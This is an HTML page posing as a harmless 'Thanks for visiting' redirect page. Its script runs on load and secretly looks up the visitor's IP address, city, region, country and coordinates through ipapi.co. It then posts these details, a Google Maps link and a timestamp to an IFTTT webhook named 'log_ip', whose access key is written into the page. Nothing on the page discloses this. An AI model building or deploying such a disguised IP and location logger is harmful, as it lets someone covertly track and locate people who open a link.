<!DOCTYPE html>
<html>
<head>
  <title>Welcome</title>
</head>
<body>
  <h1>Thanks for visiting!</h1>
  <p>You're being redirected... or click below:</p>
  <p><a id="mapLink" href="#" target="_blank">üìç View on Google Maps</a></p>

  <script>
    fetch("https://ipapi.co/json")
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const city = data.city;
        const region = data.region;
        const country = data.country_name;
        const latitude = data.latitude;
        const longitude = data.longitude;

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toISOString();

        // Show the Google Maps link on the page
        document.getElementById("mapLink").href = mapsLink;

        // Send data to IFTTT
        fetch("https://maker.ifttt.com/trigger/log_ip/with/key/kOLWy3TchheqT7scEtg8eVdDp37GpvLsgXg6Mv11HMG", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            value1: `${ip} ‚Äî ${city}, ${region}, ${country}`,
            value2: mapsLink,
            value3: timestamp
          })
        });
      });
  </script>
</body>
</html>
